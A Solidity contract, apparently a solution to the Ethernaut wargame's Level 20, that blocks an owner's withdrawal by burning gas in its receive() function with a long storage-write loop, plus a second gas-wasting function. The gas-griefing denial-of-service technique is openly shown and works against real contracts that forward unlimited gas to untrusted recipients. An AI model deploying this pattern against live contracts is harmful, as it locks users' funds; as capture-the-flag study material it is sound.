// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DenialExploit
 * @notice Ethernaut Level 20: Denial of Service exploit
 * @dev Prevents owner from withdrawing by exhausting gas in receive()
 */
contract DenialExploit {
    uint256 public counter;
    
    /**
     * @notice Exhaust gas to prevent withdrawal completion
     * @dev Called when partner receives funds via call{value}
     */
    receive() external payable {
        // Burn gas with SSTORE operations (expensive)
        for (uint256 i = 0; i < 10000; i++) {
            counter = i;
        }
    }
    
    /**
     * @notice Alternative gas waste function
     */
    function wasteGas() external {
        for (uint256 i = 0; i < 5000; i++) {
            counter++;
        }
    }
}
